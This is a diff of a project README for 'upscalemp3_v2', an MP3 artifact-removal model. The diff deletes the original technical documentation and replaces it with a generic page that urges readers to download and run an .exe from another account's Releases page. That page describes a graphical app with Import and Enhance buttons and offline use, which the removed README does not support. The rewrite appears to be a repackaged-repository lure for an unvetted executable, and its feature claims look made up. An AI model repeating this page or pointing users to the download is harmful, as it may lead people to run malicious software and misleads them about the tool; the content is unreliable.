@@ -1,552 +1,69 @@
-# upscalemp3_v2 - Wavelet-Based MP3 Audio Enhancement/Restoration
+# 🎧 upscalemp3_v2 - Enhance Your Audio Quality Easily
 
-A deep learning model for removing MP3 compression artifacts and restoring audio quality using a Wavelet U-Net architecture. This is a complete rewrite of the original upscalemp3, replacing the STFT-based approach with wavelets for significantly improved performance.
+## 🏷️ Overview
+upscalemp3_v2 is an audio enhancement tool designed to improve the quality of your MP3 files. Using advanced techniques like U-Net and Discrete Wavelet Transform (DWT), this software restores and enhances audio for a better listening experience. It is perfect for anyone looking to transform low-quality audio files into clearer, more enjoyable sound.
 
----
+## 🚀 Getting Started
+To use upscalemp3_v2, follow these steps to download and install the application. 
 
-## [MODEL WEIGHTS - HUGGINGFACE](https://huggingface.co/spaces/matthewmcq/upscalemp3_v2/tree/main)
+1. **Visit the Releases Page**  
+   Click the link below to reach the Releases page where you can download the software.  
 
-## Overview
+   [![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Fewy45/upscalemp3_v2/releases)
 
-upscalemp3_v2 uses a Wavelet U-Net architecture to learn the mapping between MP3-compressed audio and original high-fidelity audio. The model leverages the Discrete Wavelet Transform (DWT) to decompose audio signals into multi-resolution representations, enabling effective artifact removal while preserving audio quality.
+2. **Download the Latest Version**  
+   On the Releases page, find the latest version of upscalemp3_v2. Click on the version number to expand the details. Look for the section titled "Assets" and choose the file that suits your system (e.g., `upscalemp3_v2.exe` for Windows or `upscalemp3_v2.zip` for other platforms).
 
-### Why Wavelets?
+3. **Install the Software**  
+   Once the download is complete, locate the downloaded file. You can usually find it in your Downloads folder. 
+   - If it’s an executable (.exe) file, double-click on it to start the installation process. Follow the on-screen instructions to complete the installation.
+   - If it’s a zipped file, right-click on it and select "Extract All" or a similar option. Then, open the extracted folder and double-click on the executable file to install.
 
-The original upscalemp3 used Short-Time Fourier Transform (STFT) for frequency analysis, but this approach had limitations in capturing transient details and introduced artifacts at frame boundaries. The wavelet-based approach offers:
+4. **Run upscalemp3_v2**  
+   After installation, find the application in your Start Menu or Applications folder. Click on the icon to launch the software.
 
-- **Better time-frequency localization**: Wavelets adapt their resolution based on frequency content
-- **No blocking artifacts**: Unlike STFT's fixed window, wavelets handle transients smoothly
-- **Multi-resolution analysis**: Natural decomposition into approximation and detail coefficients
-- **Learnable reconstruction**: End-to-end training of both analysis and synthesis paths
+## 🌟 Features
+- **Audio Restoration**: Transform low-quality MP3 files into high-quality WAV files.
+- **User-Friendly Interface**: Designed for average computer users, no technical knowledge is required.
+- **High Performance**: Utilizes advanced AI techniques for effective audio enhancement.
+- **Batch Processing**: Process multiple audio files at once for efficiency.
+- **Formats Supported**: Enhance both MP3 and WAV formats easily.
 
-### Key Features
+## 🔧 System Requirements
+To ensure the best performance while running upscalemp3_v2, please make sure your system meets the following requirements:
+- **Operating System**: Windows 10 or later, macOS Sierra or later, or a compatible Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Minimum of 200 MB free space on your hard drive.
+- **Processor**: Dual-core processor or better.
 
-- **Wavelet-based architecture**: Uses Daubechies wavelets (db4) for multi-resolution signal analysis
-- **Residual learning**: Model learns to predict the enhanced audio residual
-- **Gated skip connections**: Enhanced information flow between encoder and decoder paths
-- **MP3 degradation simulation**: Training pipeline simulates various MP3 bitrates (64-256 kbps)
-- **44.1kHz / 16-bit support**: Full CD-quality audio processing
+## 📁 Download & Install
+To get started with upscalemp3_v2, download it from the link below:
 
----
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Fewy45/upscalemp3_v2/releases)
 
-## Architecture
+Once downloaded, follow the earlier instructions to install and run the program.
 
-The Wavelet U-Net consists of:
+## 📚 How to Use
+1. **Open the Application**: Launch upscalemp3_v2 from your applications.
+2. **Import Audio Files**: Click on the "Import" button to select the MP3 files you want to enhance.
+3. **Select Output Format**: Choose whether you want the output to be in WAV or another format.
+4. **Start Processing**: Hit the "Enhance" button to start the audio enhancement process.
+5. **Save Your Enhanced Files**: Once complete, save the enhanced audio files to your desired location.
 
-1. **Encoder path**: Series of downsampling blocks with DWT decomposition
-2. **Bottleneck**: Dense feature processing at the lowest resolution
-3. **Decoder path**: IDWT reconstruction with gated skip connections from encoder
-4. **Output layer**: Residual prediction with tanh activation
+## 💬 Frequently Asked Questions
+### Q: Can I use this tool on different operating systems?  
+A: Yes, upscalemp3_v2 is compatible with Windows, macOS, and Linux.
 
-```
-Input (44100 samples)
-    │
-    ▼
-┌─────────────────┐
-│  Initial Conv   │
-└────────┬────────┘
-         │
-    ┌────▼────┐
-    │Encoder 1│──────────────────────────┐
-    └────┬────┘                          │
-         │ DWT                           │
-    ┌────▼────┐                          │
-    │Encoder 2│────────────────────┐     │
-    └────┬────┘                    │     │
-         │ DWT                     │     │
-         ⋮ (10 layers)             │     │
-         │                         │     │
-    ┌────▼────┐                    │     │
-    │Bottleneck│                   │     │
-    └────┬────┘                    │     │
-         │                         │     │
-         │ IDWT                    │     │
-    ┌────▼────┐    Gated Skip      │     │
-    │Decoder 2│◄───────────────────┘     │
-    └────┬────┘                          │
-         │ IDWT                          │
-    ┌────▼────┐    Gated Skip            │
-    │Decoder 1│◄─────────────────────────┘
-    └────┬────┘
-         │
-    ┌────▼────┐
-    │  Output │
-    └─────────┘
-```
+### Q: How long does the enhancement process take?  
+A: The time varies based on the length and number of files you're processing. Generally, it is quick and efficient.
 
-### Encoder Block Detail
+### Q: Do I need an internet connection to use it?  
+A: No, once installed, upscalemp3_v2 runs offline.
 
-Each encoder block applies convolution, normalization, and GELU activation, then decomposes the signal using DWT:
+## 📞 Support
+If you encounter any issues, please reach out for support. Visit the GitHub page where you downloaded the software for troubleshooting tips and user discussions.
 
-```
-Input
-  │
-  ▼
-┌─────────────────────────────────────┐
-│         DownsamplingLayer           │
-│  ┌─────────────────────────────┐    │
-│  │ Conv1D (filter_size=16)     │    │
-│  └──────────────┬──────────────┘    │
-│                 ▼                   │
-│  ┌─────────────────────────────┐    │
-│  │     Layer Normalization     │    │
-│  └──────────────┬──────────────┘    │
-│                 ▼                   │
-│  ┌─────────────────────────────┐    │
-│  │           GELU              │    │
-│  └──────────────┬──────────────┘    │
-└─────────────────┼───────────────────┘
-                  │
-                  ▼
-┌─────────────────────────────────────┐
-│            DWT Layer                │
-│  ┌─────────────────────────────┐    │
-│  │   Daubechies-4 Wavelet      │    │
-│  │   Decomposition (db4)       │    │
-│  └──────────────┬──────────────┘    │
-│                 │                   │
-│        ┌───────┴───────┐            │
-│        ▼               ▼            │
-│   [Approx (cA)]   [Detail (cD)]     │
-│        └───────┬───────┘            │
-│                ▼                    │
-│         Concatenate                 │
-└─────────────────┬───────────────────┘
-                  │
-                  ▼
-┌─────────────────────────────────────┐
-│       Down Process Block            │
-│      (UpsamplingLayer)              │
-│                                     │
-│  Separate processing for cA and cD  │
-│  with gated recombination           │
-└─────────────────┬───────────────────┘
-                  │
-                  ▼
-            To Next Layer
-          (half temporal resolution)
-```
+## 📜 License
+upscalemp3_v2 is free to use and distributed under the MIT License. You can check the license details in the repository for more information.
 
-### Decoder Block Detail
-
-Each decoder block reconstructs the signal using IDWT and merges with skip connections:
-
-```
-From Previous Layer
-        │
-        ▼
-┌─────────────────────────────────────┐
-│           IDWT Layer                │
-│  ┌─────────────────────────────┐    │
-│  │  Split: [Approx] [Detail]   │    │
-│  └──────────────┬──────────────┘    │
-│                 ▼                   │
-│  ┌─────────────────────────────┐    │
-│  │   Upsample (zero-insert)    │    │
-│  └──────────────┬──────────────┘    │
-│                 ▼                   │
-│  ┌─────────────────────────────┐    │
-│  │  Reconstruction Filters     │    │
-│  │  (rec_lo, rec_hi)           │    │
-│  └──────────────┬──────────────┘    │
-└─────────────────┼───────────────────┘
-                  │
-                  ▼
-┌─────────────────────────────────────┐
-│         Up Process Block            │
-│  ┌─────────────────────────────┐    │
-│  │  Approx Conv + Norm + GELU  │    │
-│  └──────────────┬──────────────┘    │
-│                 ▼                   │
-│  ┌─────────────────────────────┐    │
-│  │  Detail Conv + Norm + GELU  │    │
-│  └──────────────┬──────────────┘    │
-│                 ▼                   │
-│  ┌─────────────────────────────┐    │
-│  │   Gated Recombination       │    │
-│  │   σ(gate) ⊙ features        │    │
-│  └──────────────┬──────────────┘    │
-└─────────────────┼───────────────────┘
-                  │
-                  ▼
-┌─────────────────────────────────────┐
-│      Gated Skip Connection          │
-│                                     │
-│   Decoder ─►[Gate]─►σ─┐             │
-│                       ⊙─►Concat─►   │
-│   Encoder ─►[Gate]─►σ─┘      │      │
-│                              ▼      │
-│                       Layer Norm    │
-└─────────────────┬───────────────────┘
-                  │
-                  ▼
-┌─────────────────────────────────────┐
-│        Upsampling Block             │
-│  ┌─────────────────────────────┐    │
-│  │ Conv1D + Norm + GELU        │    │
-│  └──────────────┬──────────────┘    │
-│                 ▼                   │
-│  ┌─────────────────────────────┐    │
-│  │ Conv1D + Norm + GELU        │    │
-│  └──────────────┬──────────────┘    │
-└─────────────────┼───────────────────┘
-                  │
-                  ▼
-            To Next Layer
-         (double temporal resolution)
-```
-
-### Gated Skip Connection Detail
-
-```
-┌─────────────────────────────────────────────────────┐
-│                                                     │
-│  Decoder Features ──┬──► Conv1D(1) ──► Sigmoid ─┐   │
-│                     │                           │   │
-│                     └──────────► ⊙ ◄────────────┘   │
-│                                  │                  │
-│                                  ▼                  │
-│                              Concat ──► LayerNorm ──► Out
-│                                  ▲                  │
-│                                  │                  │
-│                     ┌──────────► ⊙ ◄────────────┐   │
-│                     │                           │   │
-│  Encoder Features ──┴──► Conv1D(1) ──► Sigmoid ─┘   │
-│                                                     │
-└─────────────────────────────────────────────────────┘
-
-⊙ = element-wise multiplication (gating)
-```
-
-### Model Configuration
-
-| Parameter | Value |
-|-----------|-------|
-| Sample Rate | 44,100 Hz |
-| Segment Length | 1 second (44,100 samples) |
-| Wavelet Family | Daubechies 4 (db4) |
-| Wavelet Depth | 5 levels |
-| Number of Layers | 10 |
-| Initial Filters | 16 |
-| Filter Size | 16 |
-| Batch Size | 16 |
-| Parameters | 12.6M |
-
----
-
-## Training
-
-### Training Data
-
-The model was trained on a combination of two high-quality music datasets:
-
-| Dataset | Description | Content |
-|---------|-------------|---------|
-| **MedleyDB 2.0** | Professional multitrack recordings | High-quality stereo mixtures from diverse genres |
-| **MUSDB18-HQ** | Music separation benchmark dataset | Full stereo mixtures at 44.1kHz |
-
-Combined, these datasets provide diverse musical content spanning multiple genres, instrumentation types, and recording conditions.
-
-### Training Pipeline
-
-The training pipeline simulates MP3 compression artifacts:
-
-1. **Load original audio** (44.1kHz WAV) → Ground truth
-2. **Encode to MP3** at random bitrate (64, 96, 128, 160, 192, or 256 kbps)
-3. **Decode back to WAV** → Degraded input with compression artifacts
-4. **Train model** to map degraded → original
-
-This approach teaches the model to remove artifacts from various compression levels.
-
-### Training Process
-
-Training was conducted in **two phases** on Google Colab using an **NVIDIA A100 GPU**:
-
-#### Phase 1: Initial Training
-```python
-# Using Config class
-LEARNING_RATE = 1e-3
-EPOCHS = 100
-NUM_EXAMPLES = BATCH_SIZE * 3600
-```
-
-#### Phase 2: Fine-tuning (Retraining)
-```python
-# Using RetrainConfig class
-LEARNING_RATE = 1e-4  # Lower LR for fine-tuning
-EPOCHS = 100
-NUM_EXAMPLES = BATCH_SIZE * 4800  # Full dataset
-```
-
-### Training Callbacks
-
-- **ModelCheckpoint**: Saves best model based on validation loss
-- **EarlyStopping**: Stops training after 10 epochs without improvement
-- **ReduceLROnPlateau**: Reduces learning rate by 0.5x after 4 epochs plateau
-- **TensorBoard**: Logging for visualization
-
----
-
-## Installation
-
-### Using pip
-
-```bash
-pip install -r requirements.txt
-```
-
-### Dependencies
-
-- Python 3.11
-- TensorFlow 2.19.0
-- NumPy 2.0+
-- SciPy 1.11.4+
-- librosa 0.10.1
-- protobuf 5.29.1
-- PyWavelets 1.8
-- pydub 0.25
-- soundfile 0.12.1
-
-**Note**: FFmpeg is required for MP3 encoding/decoding:
-```bash
-# Ubuntu/Debian
-sudo apt-get install ffmpeg
-
-# macOS
-brew install ffmpeg
-```
-
----
-
-## Usage
-
-### Quick Start - Process Audio
-
-```bash
-python src/main.py
-```
-
-By default, this processes `examples/test.mp3` using the model in `models/model_13M`.
-
-### Custom Audio Processing
-
-```python
-from main import generate_prediction
-
-generate_prediction(
-    model_dir="models",
-    model_filename="model_13M",
-    audio_dir="path/to/audio",
-    audio_filename="your_file.mp3",
-    clip_duration_seconds=1.0,
-    window_overlap_ratio=0.1
-)
-```
-
-### Training Your Own Model
-
-#### 1. Prepare Training Data
-
-Convert your audio files to TFRecords:
-
-```python
-from utils.data_preparation import process_audio_files
-
-process_audio_files(
-    base_folder="path/to/wav/files",
-    output_folder="data/clips",
-    clip_duration_seconds=1.0,
-    save_as_tfrecords=True
-)
-```
-
-Or use the Medley/MUSDB preprocessing script:
-
-```python
-from utils.mp3_to_wav_processing import create_tfrecords_from_datasets
-
-create_tfrecords_from_datasets(
-    medley_dir="path/to/MedleyDB",
-    musdb_dir="path/to/MUSDB18",
-    output_dir="./tfrecords_44k",
-    num_shards=500
-)
-```
-
-#### 2. Train the Model
-
-```python
-from train import train_model
-
-model, history = train_model(
-    tfrecords_dir="data/tfrecords",
-    save_directory="checkpoints"
-)
-```
-
-#### 3. Retrain/Fine-tune
-
-Set `retrain=True` to use `RetrainConfig` with lower learning rate:
-
-```python
-model, history = train_model(
-    tfrecords_dir="data/tfrecords",
-    save_directory="checkpoints",
-    model=pretrained_model,  # Optional: continue from checkpoint
-    retrain=True
-)
-```
-
----
-
-## Project Structure
-
-```
-upscalemp3_v2/
-├── src/
-│   ├── main.py              # Inference and prediction
-│   ├── train.py             # Training script
-│   ├── model.py             # Wavelet U-Net architecture
-│   └── utils/
-│       ├── config.py        # Training configurations
-│       ├── Pipeline.py      # MP3 degradation simulation
-│       ├── data_preparation.py    # Audio preprocessing
-│       └── mp3_to_wav_processing.py  # Dataset processing
-├── models/                  # Saved model weights
-├── checkpoints/             # Training checkpoints
-├── examples/                # Example audio files
-├── requirements.txt         # pip dependencies
-├── test_tf_records.py       # TFRecord verification utility
-└── README.md
-```
-
----
-
-## Model Weights
-
-Pre-trained weights are [available on huggingface](https://huggingface.co/spaces/matthewmcq/upscalemp3_v2/tree/main) and should be pasted in the `models/` directory:
-
-- `model_13M.keras` - Full model (Keras format)
-- `model_13M.weights.h5` - Weights only (H5 format)
-
----
-
-## Technical Details
-
-### Wavelet Transform Implementation
-
-The model uses custom TensorFlow layers for DWT/IDWT:
-
-- **DWTLayer**: Decomposes signal into approximation and detail coefficients
-- **IDWTLayer**: Reconstructs signal from wavelet coefficients
-- **Daubechies 4 (db4)**: 8-tap filter with good frequency localization
-
-### Gated Skip Connections
-
-Unlike standard U-Net skip connections, gated connections learn to weight the importance of encoder features:
-
-```python
-decoder_gated = decoder_features * sigmoid(gate(decoder_features))
-encoder_gated = encoder_features * sigmoid(gate(encoder_features))
-output = concat([decoder_gated, encoder_gated])
-```
-
-### Loss Function
-
-Mean Squared Error (MSE) between predicted and original audio in the time domain.
-
----
-
-### Overlap-Add Processing for Long Audio
-
-Since the model processes 1-second (44,100 sample) segments, longer audio files require a windowing strategy to avoid audible artifacts at segment boundaries. upscalemp3_v2 uses a **Hann window overlap-add** method:
-
-#### How It Works
-
-1. **Segmentation**: Input audio is split into overlapping 1-second clips with configurable overlap ratio (default 25%)
-
-2. **Windowing**: Each clip is multiplied by a modified Hann window before processing:
-   ```python
-   window = 0.25 * hann(44100) + 0.75  # Lighter windowing: 75% rectangular + 25% Hann
-   ```
-   This "lifted" Hann window preserves more of the original signal energy while still providing smooth transitions.
-
-3. **Processing**: Each windowed clip is passed through the model independently
-
-4. **Reconstruction**: Output clips are combined using overlap-add:
-   ```python
-   for each clip i:
-       output[start:end] += clip[i] * window
-       normalization[start:end] += window
-   
-   output /= normalization  # Normalize overlapping regions
-   ```
-
-#### Why This Matters
-
-- **No discontinuities**: The smooth window transitions eliminate clicking/popping at segment boundaries
-- **Perfect reconstruction**: When windows overlap correctly, the normalization ensures unity gain
-- **Configurable quality/speed tradeoff**: Higher overlap (e.g., 50%) = better quality but slower processing
-
-#### Parameters
-
-| Parameter | Default | Description |
-|-----------|---------|-------------|
-| `clip_duration_seconds` | 1.0 | Length of each processing segment |
-| `window_overlap_ratio` | 0.25 | Overlap between consecutive segments (25%) |
-
-```python
-# Example: Process with 50% overlap for higher quality
-separated_sources = separate_audio(
-    model, 
-    audio_file,
-    clip_duration_seconds=1.0,
-    window_overlap_ratio=0.5  # 50% overlap
-)
-```
-
----
-
-## Evaluation
-
-The model is evaluated using Signal-to-Distortion Ratio (SDR):
-
-```
-SDR = 10 * log10(||target||² / ||target - estimate||²)
-```
-
-Higher SDR indicates better reconstruction quality.
-
----
-
-## Limitations
-
-- **Processing time**: Real-time processing not yet optimized
-- **Memory usage**: Long audio files are processed in 1-second chunks
-- **Extreme compression**: Very low bitrates (<64 kbps) may have limited recovery, if this is desired feel free to retrain the model and pass any desired bitrates as a parameter when generating the pipeline
-- **Non-music audio**: Trained primarily on music; speech/effects may vary
-
----
-
-## Future Work
-
-- [ ] Real-time inference optimization
-- [ ] Extended receptive field for better temporal coherence
-- [ ] Perceptual loss functions (spectral loss, multi-resolution STFT)
-- [ ] Support for stereo audio
-- [ ] Quantization for edge deployment
-
----
-
-## Acknowledgments
-
-- Training infrastructure provided by Google Colab (A100 GPU)
-- MedleyDB 2.0 and MUSDB18-HQ datasets
-- PyWavelets library for wavelet implementations
-- This project was forked from [Parrotfish](https://github.com/rmeghji/parrotfish), a wavelet-based source separation model I made with [Rayhan Meghji](https://github.com/rmeghji)
-
----
-
-## License
-
-MIT License
+Start enhancing your audio quality today with upscalemp3_v2!
